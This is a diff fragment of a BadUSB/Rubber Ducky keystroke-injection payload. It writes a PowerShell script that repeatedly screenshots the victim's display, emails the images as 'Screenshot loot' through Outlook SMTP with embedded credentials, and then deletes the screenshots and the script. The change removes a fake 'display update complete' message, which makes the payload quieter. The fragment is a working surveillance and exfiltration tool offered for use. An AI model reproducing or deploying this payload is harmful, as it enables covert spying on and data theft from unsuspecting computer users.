@@ -45,7 +45,7 @@ REM change USER@EXAMPLE.COM (3 times) and USERPASSWORD (once) to your credential
 STRING "Send-MailMessage -From USER@EXAMPLE.COM -To USER@EXAMPLE.COM -Subject `"Screenshot loot`" -Body `"Please find attached your screenshot update`" -Attachment `"Pictures\Screens\`$filename`" -SmtpServer smtp-mail.outlook.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList USER@EXAMPLE.COM, (ConvertTo-SecureString -String `"USERPASSWORD`" -AsPlainText -Force))" | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
-STRING "start-sleep -seconds 60 `n} `nSet-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser `nGet-ChildItem Pictures\Screens -Include *.* -Recurse | ForEach {`$_.Delete()} `nRemove-Item Pictures\screens -Confirm:`$false `nRemove-Item Pictures\screens.ps1 -Force `nWrite-Host 'DISPLAY UPDATE COMPLETE = YOU CAN NOW CLOSE THIS WINDOW' -ForegroundCOlor Green `nexit" | Out-File Pictures\screens.ps1 -Append
+STRING "start-sleep -seconds 60 `n} `nSet-ExecutionPolicy -ExecutionPolicy Undefined -Scope CurrentUser `nGet-ChildItem Pictures\Screens -Include *.* -Recurse | ForEach {`$_.Delete()} `nRemove-Item Pictures\screens -Confirm:`$false `nRemove-Item Pictures\screens.ps1 -Force `nexit" | Out-File Pictures\screens.ps1 -Append
 ENTER
 DELAY 200
 STRING exit
